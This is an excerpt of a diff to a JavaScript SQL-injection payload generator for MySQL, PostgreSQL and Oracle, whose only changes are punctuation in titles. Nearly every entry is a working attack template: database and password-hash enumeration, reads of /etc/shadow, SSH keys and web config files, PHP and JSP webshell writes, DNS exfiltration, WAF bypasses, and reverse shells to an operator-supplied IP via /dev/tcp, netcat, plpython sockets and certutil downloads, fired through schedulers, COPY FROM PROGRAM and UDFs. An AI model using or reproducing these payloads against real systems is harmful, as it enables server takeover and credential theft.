+        payload: (ip,port) => `-- Event Scheduler fires independently - bypasses "stacked queries not allowed" restriction\n-- Requires: EVENT privilege + sys_exec UDF already loaded\n\n-- Step 1: confirm event scheduler is on\n'; SELECT @@event_scheduler;--\n\n-- Step 2: enable if off\n'; SET GLOBAL event_scheduler=ON;--\n\n-- Step 3: create one-shot event for reverse shell\n'; CREATE EVENT IF NOT EXISTS rev_shell ON SCHEDULE AT NOW() + INTERVAL 3 SECOND ON COMPLETION NOT PRESERVE ENABLE DO SELECT sys_exec('bash -c "bash -i >& /dev/tcp/${ip}/${port} 0>&1"');--\n\n-- Step 4 (Windows variant):\n'; CREATE EVENT IF NOT EXISTS rev_shell ON SCHEDULE AT NOW() + INTERVAL 3 SECOND ON COMPLETION NOT PRESERVE ENABLE DO SELECT sys_exec('cmd /c certutil -urlcache -split -f http://${ip}:${HP}/nc.exe %TEMP%\\\\nc.exe & %TEMP%\\\\nc.exe ${ip} ${port} -e cmd.exe');--\n\n-- cleanup:\n'; DROP EVENT IF EXISTS rev_shell;--`,
+        note:(ip,port) => `Event fires 3s after inject - start listener first. Works even when PDO blocks stacked queries. nc -lvnp ${port}`
       });
 
       all.push({
-        id:'mysql-udf', title:'MySQL — UDF (User Defined Function) RCE',
+        id:'mysql-udf', title:'MySQL - UDF (User Defined Function) RCE',
         db:['mysql'], tech:['rce'], ctx:['post','get'],
-        payload: (ip,port) => `-- Step 1: find plugin directory\n' UNION SELECT 1,@@plugin_dir,3--+\n\n-- Step 2: use sqlmap for automated UDF chain (easiest path)\n-- sqlmap -u "URL" --data="PARAM=*" --os-shell --technique=U\n\n-- Step 3: manual — after UDF .so is loaded:\n-- CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';\n-- SELECT sys_exec('bash -i >& /dev/tcp/${ip}/${port} 0>&1');`,
+        payload: (ip,port) => `-- Step 1: find plugin directory\n' UNION SELECT 1,@@plugin_dir,3--+\n\n-- Step 2: use sqlmap for automated UDF chain (easiest path)\n-- sqlmap -u "URL" --data="PARAM=*" --os-shell --technique=U\n\n-- Step 3: manual - after UDF .so is loaded:\n-- CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';\n-- SELECT sys_exec('bash -i >& /dev/tcp/${ip}/${port} 0>&1');`,
         note:(ip,port) => `Requires SUPER + FILE privilege. sqlmap --os-shell handles the full chain. nc -lvnp ${port}`
       });
     }
 
     if (techs.includes('union')) {
       all.push({
-        id:'mysql-union-chain', title:'MySQL — full UNION enumeration chain',
+        id:'mysql-union-chain', title:'MySQL - full UNION enumeration chain',
         db:['mysql'], tech:['union'], ctx:['post','get'],
         payload: () => `-- Step 1: column count\n' ORDER BY 1--+\n' ORDER BY 4--+    (increment until error → N-1 is count)\n\n-- Step 2: find visible columns\n' UNION SELECT 1,2,3,4--+\n\n-- Step 3: enumerate\n' UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata--+\n' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--+\n' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--+\n' UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users--+\n' UNION SELECT 1,user(),@@version,@@datadir--+\n' UNION SELECT 1,load_file('/etc/passwd'),3,4--+`
       });
@@ -1768,7 +1768,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('err')) {
       all.push({
-        id:'mysql-err-chain', title:'MySQL — error-based (extractvalue / updatexml)',
+        id:'mysql-err-chain', title:'MySQL - error-based (extractvalue / updatexml)',
         db:['mysql'], tech:['err'], ctx:['post','get'],
         payload: () => `' AND extractvalue(1,concat(0x7e,version(),0x7e,user(),0x7e,database()))--\n' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--\n' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--\n' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM users)))--\n' AND updatexml(null,concat(0x7e,(SELECT password FROM mysql.user LIMIT 1)),null)--`
       });
@@ -1776,7 +1776,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('blind')) {
       all.push({
-        id:'mysql-blind', title:'MySQL — blind boolean + time chain',
+        id:'mysql-blind', title:'MySQL - blind boolean + time chain',
         db:['mysql'], tech:['blind'], ctx:['post','get','json'],
         payload: () => `-- boolean:\n' AND (SELECT COUNT(*) FROM users)>0--\n' AND SUBSTRING(version(),1,1)='8'--\n' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--\n\n-- time-based (5s = TRUE):\n' AND SLEEP(5)--\n' AND IF(1=1,SLEEP(5),0)--\n' AND IF(SUBSTRING(version(),1,1)='8',SLEEP(5),0)--\n' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--`
       });
@@ -1784,7 +1784,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('oob')) {
       all.push({
-        id:'mysql-oob', title:'MySQL — OOB DNS via LOAD_FILE UNC (Windows MySQL)',
+        id:'mysql-oob', title:'MySQL - OOB DNS via LOAD_FILE UNC (Windows MySQL)',
         db:['mysql'], tech:['oob'], ctx:['post','get'],
         payload: (ip) => `' UNION SELECT load_file(concat('\\\\\\\\',database(),'.${ip}\\\\x'))--+\n\n-- Burp Collaborator:\n' UNION SELECT load_file(concat(0x5c5c,YOUR_COLLAB,0x2f,'x'))--+`
       });
@@ -1792,7 +1792,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('fw')) {
       all.push({
-        id:'mysql-dumpfile', title:'MySQL — INTO DUMPFILE (binary write, no newline mangling)',
+        id:'mysql-dumpfile', title:'MySQL - INTO DUMPFILE (binary write, no newline mangling)',
         db:['mysql'], tech:['fw'], ctx:['post','get'],
         payload: () => `-- DUMPFILE vs OUTFILE: DUMPFILE writes raw bytes, no newline conversion\n-- Use for binary files (shared libs, ELF/PE)\n' UNION SELECT 0x3c3f70687020...hex... INTO DUMPFILE '/var/www/html/x.php'--+\n\n-- write webshell (hex-encoded PHP):\n' UNION SELECT 0x3c3f7068702073797374656d28245f524551554553545b27637d5d293b3f3e INTO DUMPFILE '/var/www/html/x.php'--+\n\n-- check writable paths first:\n' UNION SELECT 1,@@datadir,3--+\n' UNION SELECT 1,@@plugin_dir,3--+`,
         note:'0x3c3f7068702073797374656d28245f524551554553545b27637d5d293b3f3e = <?php system($_REQUEST[c]);?>'
@@ -1801,16 +1801,16 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('union')) {
       all.push({
-        id:'mysql-hash-dump', title:'MySQL — dump password hashes + read sensitive files',
+        id:'mysql-hash-dump', title:'MySQL - dump password hashes + read sensitive files',
         db:['mysql'], tech:['union'], ctx:['post','get'],
         payload: () => `-- dump MySQL user hashes (needs mysql.user access):\n' UNION SELECT 1,group_concat(user,0x3a,authentication_string SEPARATOR 0x0a),3 FROM mysql.user--+\n\n-- read /etc/passwd:\n' UNION SELECT 1,load_file('/etc/passwd'),3--+\n\n-- read /etc/shadow (needs FILE + root):\n' UNION SELECT 1,load_file('/etc/shadow'),3--+\n\n-- read SSH private key:\n' UNION SELECT 1,load_file('/home/user/.ssh/id_rsa'),3--+\n\n-- read web app config (find DB creds):\n' UNION SELECT 1,load_file('/var/www/html/config.php'),3--+\n' UNION SELECT 1,load_file('/var/www/html/wp-config.php'),3--+\n' UNION SELECT 1,load_file('/var/www/html/application/config/database.php'),3--+`,
         note:'FILE privilege required for load_file. Check: SHOW GRANTS; and @@secure_file_priv value.'
       });
 
       all.push({
-        id:'mysql-ischema-bypass', title:'MySQL — information_schema bypass (when WAF blocks it)',
+        id:'mysql-ischema-bypass', title:'MySQL - information_schema bypass (when WAF blocks it)',
         db:['mysql'], tech:['union','bypass'], ctx:['post','get'],
-        payload: () => `-- sys schema (MySQL 5.7+) — alternative to information_schema:\n' UNION SELECT 1,group_concat(table_name),3 FROM sys.schema_table_statistics WHERE table_schema=database()--+\n\n-- performance_schema (always available):\n' UNION SELECT 1,group_concat(table_name),3 FROM performance_schema.tables WHERE table_schema=database()--+\n\n-- mysql.innodb_table_stats (InnoDB only):\n' UNION SELECT 1,group_concat(table_name),3 FROM mysql.innodb_table_stats WHERE database_name=database()--+\n\n-- blind via PROCEDURE ANALYSE (older MySQL):\n' AND 1=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,version())),1)--+\n\n-- JSON_KEYS on JSON column (WAF bypass for UNION):\n' AND JSON_KEYS((SELECT CONVERT((SELECT GROUP_CONCAT(username,0x3a,password) FROM users) USING utf8)))--+`,
+        payload: () => `-- sys schema (MySQL 5.7+) - alternative to information_schema:\n' UNION SELECT 1,group_concat(table_name),3 FROM sys.schema_table_statistics WHERE table_schema=database()--+\n\n-- performance_schema (always available):\n' UNION SELECT 1,group_concat(table_name),3 FROM performance_schema.tables WHERE table_schema=database()--+\n\n-- mysql.innodb_table_stats (InnoDB only):\n' UNION SELECT 1,group_concat(table_name),3 FROM mysql.innodb_table_stats WHERE database_name=database()--+\n\n-- blind via PROCEDURE ANALYSE (older MySQL):\n' AND 1=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,version())),1)--+\n\n-- JSON_KEYS on JSON column (WAF bypass for UNION):\n' AND JSON_KEYS((SELECT CONVERT((SELECT GROUP_CONCAT(username,0x3a,password) FROM users) USING utf8)))--+`,
         note:'Use when WAF specifically blocks "information_schema". sys/performance_schema are rarely filtered.'
       });
     }
@@ -1821,16 +1821,16 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('rce')) {
       all.push({
-        id:'pg-copy-prog', title:'PostgreSQL — COPY FROM PROGRAM OS command execution',
+        id:'pg-copy-prog', title:'PostgreSQL - COPY FROM PROGRAM OS command execution',
         db:['pg'], tech:['rce'], ctx:['post','get'],
-        payload: (ip,port) => `-- STANDALONE reverse shell (no staging table needed — direct):\n'; COPY (SELECT 1) TO PROGRAM 'bash -c "bash -i >& /dev/tcp/${ip}/${port} 0>&1"';--\n'; COPY (SELECT 1) TO PROGRAM 'bash -c "sh -i >& /dev/tcp/${ip}/${port} 0>&1"';--\n'; COPY (SELECT 1) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip} ${port}>/tmp/f';--\n'; COPY (SELECT 1) TO PROGRAM 'curl http://${ip}:${HP}/s.sh|bash';--\n\n-- staging table method (requires superuser):\n'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(o text); COPY cmd_exec FROM PROGRAM ''id''; SELECT * FROM cmd_exec;--`,
+        payload: (ip,port) => `-- STANDALONE reverse shell (no staging table needed - direct):\n'; COPY (SELECT 1) TO PROGRAM 'bash -c "bash -i >& /dev/tcp/${ip}/${port} 0>&1"';--\n'; COPY (SELECT 1) TO PROGRAM 'bash -c "sh -i >& /dev/tcp/${ip}/${port} 0>&1"';--\n'; COPY (SELECT 1) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip} ${port}>/tmp/f';--\n'; COPY (SELECT 1) TO PROGRAM 'curl http://${ip}:${HP}/s.sh|bash';--\n\n-- staging table method (requires superuser):\n'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(o text); COPY cmd_exec FROM PROGRAM ''id''; SELECT * FROM cmd_exec;--`,
         note:(ip,port) => `nc -lvnp ${port}  or  python3 -m http.server ${port} (for curl cradle)`
       });
     }
 
     if (techs.includes('fw')) {
       all.push({
-        id:'pg-largeobj', title:'PostgreSQL — Large Object file write (webshell path)',
+        id:'pg-largeobj', title:'PostgreSQL - Large Object file write (webshell path)',
         db:['pg'], tech:['fw'], ctx:['post','get'],
         payload: () => `'; SELECT lo_from_bytea(43210,'<?php system($_GET[c]);?>');\nSELECT lo_export(43210,'/var/www/html/shell.php');\nSELECT lo_unlink(43210);--\n\n-- verify write by reading it back:\n'; SELECT lo_import('/etc/passwd',43211);\nSELECT encode(lo_get(43211),'escape');--`
       });
@@ -1838,7 +1838,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('union')) {
       all.push({
-        id:'pg-union-chain', title:'PostgreSQL — UNION enumeration chain',
+        id:'pg-union-chain', title:'PostgreSQL - UNION enumeration chain',
         db:['pg'], tech:['union'], ctx:['post','get'],
         payload: () => `-- column count:\n' ORDER BY 1--\n' ORDER BY 3--    (increment until error)\n\n-- UNION:\n' UNION SELECT NULL,NULL--\n' UNION SELECT version(),current_user--\n' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0--\n' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0--\n' UNION SELECT usename||':'||passwd,NULL FROM pg_shadow--    (superuser only)\n' UNION SELECT username||':'||password,NULL FROM users LIMIT 1--`
       });
@@ -1846,7 +1846,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('err')) {
       all.push({
-        id:'pg-err', title:'PostgreSQL — error-based CAST exfil',
+        id:'pg-err', title:'PostgreSQL - error-based CAST exfil',
         db:['pg'], tech:['err'], ctx:['post','get'],
         payload: () => `' AND CAST(version() AS int)=1--\n' AND CAST(current_user AS int)=1--\n' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)--\n' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) AS int)--\n' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
       });
@@ -1854,7 +1854,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('blind')) {
       all.push({
-        id:'pg-blind', title:'PostgreSQL — blind time-based chain',
+        id:'pg-blind', title:'PostgreSQL - blind time-based chain',
         db:['pg'], tech:['blind'], ctx:['post','get'],
         payload: () => `-- 5s delay = condition TRUE\n' AND 1=(SELECT 1 FROM pg_sleep(5))--\n' AND 1=(SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END)--\n' AND 1=(SELECT CASE WHEN SUBSTRING(current_user,1,1)='p' THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END)--\n' AND 1=(SELECT CASE WHEN SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END)--`
       });
@@ -1862,7 +1862,7 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('oob')) {
       all.push({
-        id:'pg-oob-dblink', title:'PostgreSQL — OOB via dblink + DNS',
+        id:'pg-oob-dblink', title:'PostgreSQL - OOB via dblink + DNS',
         db:['pg'], tech:['oob'], ctx:['post','get'],
         payload: (ip) => `'; CREATE EXTENSION IF NOT EXISTS dblink;\nSELECT dblink_connect('host=${ip} dbname=x user=a password=a');--\n\n-- exfil current user in DNS:\n'; SELECT dblink_send_query(dblink_connect('host='||(SELECT current_user)||'.${ip} dbname=x user=a password=a'),'SELECT 1');--`
       });
@@ -1870,21 +1870,21 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('union') || techs.includes('rce') || techs.includes('fw')) {
       all.push({
-        id:'pg-file-read', title:'PostgreSQL — pg_read_file / pg_ls_dir (superuser file access)',
+        id:'pg-file-read', title:'PostgreSQL - pg_read_file / pg_ls_dir (superuser file access)',
         db:['pg'], tech:['fw','union'], ctx:['post','get'],
         payload: () => `-- read file (superuser only, relative to data dir):\n'; SELECT pg_read_file('/etc/passwd');--\n'; SELECT pg_read_file('pg_hba.conf');--\n\n-- list directory:\n'; SELECT * FROM pg_ls_dir('/');--\n'; SELECT * FROM pg_ls_dir('/home');--\n\n-- read PostgreSQL password hashes:\n'; SELECT usename||':'||passwd FROM pg_shadow;--\n\n-- read arbitrary file with pg_read_binary_file:\n'; SELECT convert_from(pg_read_binary_file('/etc/passwd'),'UTF8');--\n\n-- full path via setting:\n'; SELECT current_setting('data_directory');--`,
         note:'Requires superuser. pg_hba.conf often has credentials. pg_shadow has MD5 hashes.'
       });
 
       all.push({
-        id:'pg-plpython', title:'PostgreSQL — plpython3u RCE (if extension enabled)',
+        id:'pg-plpython', title:'PostgreSQL - plpython3u RCE (if extension enabled)',
         db:['pg'], tech:['rce'], ctx:['post','get'],
-        payload: (ip,port) => `-- plpython3u gives full Python execution inside PG — very powerful\n-- Check if available: SELECT lanname FROM pg_language WHERE lanname='plpython3u';\n\n-- Standalone reverse shell (one inject):\n'; DO $$ import socket,subprocess,os; s=socket.socket(); s.connect(("${ip}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]) $$ LANGUAGE plpython3u;--\n\n-- Via CREATE FUNCTION (persists):\n'; CREATE OR REPLACE FUNCTION rev_shell() RETURNS void AS $$ import socket,subprocess,os; s=socket.socket(); s.connect(("${ip}",${port})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call(["/bin/bash","-i"]) $$ LANGUAGE plpython3u;--\n'; SELECT rev_shell();--\n\n-- Command execution (blind output via OOB):\n'; CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS text AS $$ import subprocess; return subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT).decode() $$ LANGUAGE plpython3u;--\n'; SELECT exec_cmd('id');--`,
+        payload: (ip,port) => `-- plpython3u gives full Python execution inside PG - very powerful\n-- Check if available: SELECT lanname FROM pg_language WHERE lanname='plpython3u';\n\n-- Standalone reverse shell (one inject):\n'; DO $$ import socket,subprocess,os; s=socket.socket(); s.connect(("${ip}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]) $$ LANGUAGE plpython3u;--\n\n-- Via CREATE FUNCTION (persists):\n'; CREATE OR REPLACE FUNCTION rev_shell() RETURNS void AS $$ import socket,subprocess,os; s=socket.socket(); s.connect(("${ip}",${port})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call(["/bin/bash","-i"]) $$ LANGUAGE plpython3u;--\n'; SELECT rev_shell();--\n\n-- Command execution (blind output via OOB):\n'; CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS text AS $$ import subprocess; return subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT).decode() $$ LANGUAGE plpython3u;--\n'; SELECT exec_cmd('id');--`,
         note:(ip,port) => `plpython3u = untrusted = superuser only. Check first. Common on misconfigured cloud DBs. nc -lvnp ${port}`
       });
 
       all.push({
-        id:'pg-do-block', title:'PostgreSQL — DO $$ anonymous block (procedural RCE)',
+        id:'pg-do-block', title:'PostgreSQL - DO $$ anonymous block (procedural RCE)',
         db:['pg'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `-- anonymous PL/pgSQL block for RCE:\n'; DO $$ BEGIN PERFORM dblink_exec(''host=127.0.0.1'',''COPY cmd_exec FROM PROGRAM $$bash -c "bash -i >& /dev/tcp/${ip}/${port} 0>&1"$$''); END; $$;--\n\n-- simpler via COPY FROM PROGRAM directly:\n'; DO $$ DECLARE r text; BEGIN EXECUTE 'COPY (SELECT 1) TO PROGRAM ''bash -i >& /dev/tcp/${ip}/${port} 0>&1'''; END; $$;--\n\n-- DO block to write webshell:\n'; DO $$ DECLARE f text; BEGIN SELECT ''<?php system($_GET[c]);?>'' INTO f; COPY (SELECT f) TO ''/var/www/html/x.php''; END; $$;--`,
         note:(ip,port) => `nc -lvnp ${port}  ← start first. DO blocks bypass some SQL injection filters that block COPY.`
@@ -1897,16 +1897,16 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('rce')) {
       all.push({
-        id:'oracle-java', title:'Oracle — Java stored procedure RCE',
+        id:'oracle-java', title:'Oracle - Java stored procedure RCE',
         db:['oracle'], tech:['rce'], ctx:['post','get'],
         payload: (ip,port) => `-- Requires JAVA_ADMIN / CREATE PROCEDURE + JAVA permissions\n-- Step 1: grant perms\nEXEC DBMS_JAVA.GRANT_PERMISSION(USER,'java.io.FilePermission','<<ALL FILES>>','execute');\n\n-- Step 2: create Java class\nCREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OS" AS\nimport java.io.*;\npublic class OS {\n  public static String exec(String cmd) throws Exception {\n    Runtime rt = Runtime.getRuntime();\n    String[] c = {"/bin/bash","-c",cmd};\n    Process p = rt.exec(c);\n    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n    StringBuilder sb = new StringBuilder(); String l;\n    while ((l=r.readLine())!=null) sb.append(l).append("\\n");\n    return sb.toString();\n  }\n};\n\n-- Step 3: wrap as SQL function\nCREATE OR REPLACE FUNCTION os_cmd(cmd VARCHAR2) RETURN VARCHAR2\nAS LANGUAGE JAVA NAME 'OS.exec(java.lang.String) return java.lang.String';\n\n-- Step 4: execute\nSELECT os_cmd('bash -i >& /dev/tcp/${ip}/${port} 0>&1') FROM dual;`,
-        note:(ip,port) => `Complex — check Java is enabled: SELECT * FROM v$option WHERE PARAMETER='Java'. nc -lvnp ${port}`
+        note:(ip,port) => `Complex - check Java is enabled: SELECT * FROM v$option WHERE PARAMETER='Java'. nc -lvnp ${port}`
       });
     }
 
     if (techs.includes('fw')) {
       all.push({
-        id:'oracle-utlfile', title:'Oracle — UTL_FILE write (needs directory object)',
+        id:'oracle-utlfile', title:'Oracle - UTL_FILE write (needs directory object)',
         db:['oracle'], tech:['fw'], ctx:['post','get'],
         payload: () => `-- enumerate accessible directories:\nSELECT directory_name,directory_path FROM all_directories;\n\n-- write webshell (replace DIR_NAME with a writable directory):\nDECLARE f utl_file.file_type;\nBEGIN\n  f := utl_file.fopen('DIR_NAME','shell.jsp','W');\n  utl_file.put_line(f,'<%Runtime.getRuntime().exec(request.getParameter("c"));%>');\n  utl_file.fclose(f);\nEND;`
       });
@@ -1914,32 +1914,32 @@ function buildPayloads(ip, port, http_port, param, ctype, extras, dbs, techs, ct
 
     if (techs.includes('rce')) {
       all.push({
-        id:'oracle-dbms-scheduler', title:'Oracle — DBMS_SCHEDULER OS command execution (most reliable)',
+        id:'oracle-dbms-scheduler', title:'Oracle - DBMS_SCHEDULER OS command execution (most reliable)',
         db:['oracle'], tech:['rce'], ctx:['post','get'],
-        payload: (ip,port) => `-- Linux (single-line Intruder-ready — fires bash reverse shell):\n'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'J1',job_type=>'EXECUTABLE',job_action=>'/bin/bash',number_of_arguments=>3,enabled=>FALSE,auto_drop=>TRUE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1',1,'-c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1',2,'bash -i >& /dev/tcp/${ip}/${port} 0>&1'); DBMS_SCHEDULER.ENABLE('J1'); END;--\n\n-- Windows (single-line):\n'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'W1',job_type=>'EXECUTABLE',job_action=>'C:\\Windows\\System32\\cmd.exe',number_of_arguments=>3,enabled=>FALSE,auto_drop=>TRUE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('W1',1,'/c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('W1',2,'certutil -urlcache -split -f http://${ip}:${HP}/nc.exe %TEMP%\\nc.exe & %TEMP%\\nc.exe ${ip} ${port} -e cmd.exe'); DBMS_SCHEDULER.ENABLE('W1'); END;--\n\n-- Cleanup + check status:\n'; SELECT job_name,state FROM dba_scheduler_jobs WHERE job_name IN ('J1','W1');--\n'; BEGIN DBMS_SCHEDULER.DROP_JOB('J1'); END;--`,
-        note:(ip,port) => `Available Oracle 10g+. Fires async — start listener before enabling. nc -lvnp ${port}`
+        payload: (ip,port) => `-- Linux (single-line Intruder-ready - fires bash reverse shell):\n'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'J1',job_type=>'EXECUTABLE',job_action=>'/bin/bash',number_of_arguments=>3,enabled=>FALSE,auto_drop=>TRUE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1',1,'-c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1',2,'bash -i >& /dev/tcp/${ip}/${port} 0>&1'); DBMS_SCHEDULER.ENABLE('J1'); END;--\n\n-- Windows (single-line):\n'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'W1',job_type=>'EXECUTABLE',job_action=>'C:\\Windows\\System32\\cmd.exe',number_of_arguments=>3,enabled=>FALSE,auto_drop=>TRUE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('W1',1,'/c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('W1',2,'certutil -urlcache -split -f http://${ip}:${HP}/nc.exe %TEMP%\\nc.exe & %TEMP%\\nc.exe ${ip} ${port} -e cmd.exe'); DBMS_SCHEDULER.ENABLE('W1'); END;--\n\n-- Cleanup + check status:\n'; SELECT job_name,state FROM dba_scheduler_jobs WHERE job_name IN ('J1','W1');--\n'; BEGIN DBMS_SCHEDULER.DROP_JOB('J1'); END;--`,
+        note:(ip,port) => `Available Oracle 10g+. Fires async - start listener before enabling. nc -lvnp ${port}`
       });
 
       all.push({
-        id:'oracle-external-table', title:'Oracle — External Table preprocessor RCE',
+        id:'oracle-external-table', title:'Oracle - External Table preprocessor RCE',
         db:['oracle'], tech:['rce'], ctx:['post','get'],
-        payload: (ip,port) => `-- External table preprocessor executes OS binary when table is queried\n-- Requires: CREATE TABLE + CREATE ANY DIRECTORY\n\n-- Step 1: create directory object\n'; CREATE OR REPLACE DIRECTORY pwn_dir AS '/tmp';--\n\n-- Step 2: write rev shell script to /tmp/rev.sh via UTL_FILE first, then:\n-- echo 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' > /tmp/rev.sh && chmod +x /tmp/rev.sh\n\n-- Step 3: create external table (all on one line — Intruder-ready):\n'; CREATE TABLE ext_rev (o VARCHAR2(4000)) ORGANIZATION EXTERNAL (TYPE oracle_loader DEFAULT DIRECTORY pwn_dir ACCESS PARAMETERS (RECORDS DELIMITED BY NEWLINE PREPROCESSOR pwn_dir:''rev.sh'' FIELDS TERMINATED BY NEWLINE) LOCATION (pwn_dir:''x'')) REJECT LIMIT UNLIMITED;--\n\n-- Step 4: trigger execution\n'; SELECT * FROM ext_rev;--\n\n-- Cleanup:\n'; DROP TABLE ext_rev;--\n'; DROP DIRECTORY pwn_dir;--`,
+        payload: (ip,port) => `-- External table preprocessor executes OS binary when table is queried\n-- Requires: CREATE TABLE + CREATE ANY DIRECTORY\n\n-- Step 1: create directory object\n'; CREATE OR REPLACE DIRECTORY pwn_dir AS '/tmp';--\n\n-- Step 2: write rev shell script to /tmp/rev.sh via UTL_FILE first, then:\n-- echo 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' > /tmp/rev.sh && chmod +x /tmp/rev.sh\n\n-- Step 3: create external table (all on one line - Intruder-ready):\n'; CREATE TABLE ext_rev (o VARCHAR2(4000)) ORGANIZATION EXTERNAL (TYPE oracle_loader DEFAULT DIRECTORY pwn_dir ACCESS PARAMETERS (RECORDS DELIMITED BY NEWLINE PREPROCESSOR pwn_dir:''rev.sh'' FIELDS TERMINATED BY NEWLINE) LOCATION (pwn_dir:''x'')) REJECT LIMIT UNLIMITED;--\n\n-- Step 4: trigger execution\n'; SELECT * FROM ext_rev;--\n\n-- Cleanup:\n'; DROP TABLE ext_rev;--\n'; DROP DIRECTORY pwn_dir;--`,
         note:(ip,port) => `Write rev.sh to /tmp first via UTL_FILE or xp_cmdshell equiv. Rarely filtered by Oracle security configs. nc -lvnp ${port}`
       });
     }
 
     if (techs.includes('union')) {
       all.push({
-        id:'oracle-union-chain', title:'Oracle — UNION enumeration (FROM dual required)',
+        id:'oracle-union-chain', title:'Oracle - UNION enumeration (FROM dual required)',
         db:['oracle'], tech:['union'], ctx:['post','get'],
         payload: () => `-- Oracle REQUIRES FROM clause: use FROM dual for single-row selects\n-- Step 1: column count\n' ORDER BY 1--\n' ORDER BY 2--\n\n-- Step 2: UNION with NULLs from dual\n' UNION SELECT NULL,NULL FROM dual--\n' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--\n' UNION SELECT user,NULL FROM dual--\n' UNION SELECT table_name,NULL FROM all_tables WHERE rownum=1--\n' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS' AND rownum=1--\n' UNION SELECT username||':'||password,NULL FROM users WHERE rownum=1--`,
-        note:'No stacked queries via standard Oracle SQLi. No SLEEP() — use DBMS_PIPE for time-based.'
+        note:'No stacked queries via standard Oracle SQLi. No SLEEP() - use DBMS_PIPE for time-based.'
       });
     }
 
     if (techs.includes('err')) {
       all.push({
-        id:'oracle-err', title:'Oracle — error-based via CTXSYS',
+        id:'oracle-err', title:'Oracle - error-based via CTXSYS',
         db:['oracle'], tech:['err'], ctx:['post','get'],
